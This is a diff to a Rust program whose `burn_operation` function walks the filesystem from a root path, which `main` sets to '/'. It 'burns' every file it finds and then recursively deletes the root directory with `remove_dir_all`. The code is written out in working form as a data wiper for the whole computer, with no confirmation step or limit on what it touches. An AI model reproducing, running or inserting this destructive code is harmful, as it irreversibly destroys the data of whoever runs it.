@@ -6,19 +6,27 @@ use rand::Rng;
 use std::io::Write;
 
 fn main() -> std::io::Result<()> {
-    burn_operation()?;
+    burn_operation("/")?;
     Ok(())
 }
 
     
-fn burn_operation() -> std::io::Result<()> {
+fn burn_operation(root: &str) -> std::io::Result<()> {
     //for every file on the computer, burn_file
-    for file_path in WalkDir::new("/") {
-      if file_path.as_ref().unwrap().path().to_str()!=Some("/"){
-        println!("Burning {}", file_path.as_ref().unwrap().path().display());
-        burn_file(file_path.unwrap().path().display().to_string().as_str())?;
+    for file_path in WalkDir::new(&root) {
+      let file_path = file_path.unwrap().path().display().to_string();
+      let md = metadata(&file_path).unwrap();
+      
+      //if the file_path is a file
+      if md.is_file(){
+        println!("Burning {}", &file_path);
+        //burn the file
+        burn_file(file_path.as_str())?;
         }
       }
+
+      //delete the directories that are in root
+      fs::remove_dir_all(&root)?;
       
 
    Ok(())
